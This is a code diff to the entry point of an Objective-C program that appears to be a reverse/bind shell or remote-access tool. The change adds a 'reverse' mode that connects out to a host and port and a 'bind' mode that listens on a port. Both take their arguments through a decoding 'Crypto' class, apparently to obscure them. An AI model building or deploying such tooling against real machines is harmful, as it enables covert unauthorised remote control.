@@ -28,27 +28,43 @@
 #import "console.h"
 #import "utils.h"
 
+Crypto *crypto = [[Crypto alloc] init];
+
 void listenServer(int remotePort);
 void connectServer(NSString *remote_host, int remote_port);
 
 int main(int argc, const char *argv[]) {
     @autoreleasepool {
-        if (argc < 3)
-            return -1;
-        else {
+        if (argc > 1) {
+            NSString *host, *port;
+
             NSMutableArray *args = [NSMutableArray array];
             for (int i = 0; i < argc; i++) {
                 NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                 [args addObject:str];
             }
-            
-            Crypto *crypto = [[Crypto alloc] init];
 
-            NSString *remoteHost = [crypto crypto:args[1]];
-            int remotePort = [[crypto crypto:args[2]] integerValue];
+            if ([args[1] isEqualToString:@"reverse"]) {
+                if (argc >= 4) {
+                    host = [crypto crypto:args[2]];
+                    port = [crypto crypto:args[3]];
+                } else if (argc >= 3) {
+                    host = @"127.0.0.1";
+                    port = [crypto crypto:args[2]];
+                } else
+                    return -1;
 
-            connectToServer(remoteHost, remotePort);
-        }
+                connectServer(host, [port integerValue]);
+            } else if ([args[1] isEqualToString:@"bind"]) {
+                if (argc >= 3)
+                    port = [crypto crypto:args[2]];
+                else
+                    return -1;
+
+                listenServer([port integerValue]);
+            }
+        } else
+            return -1;
     }
     return 0;
 }
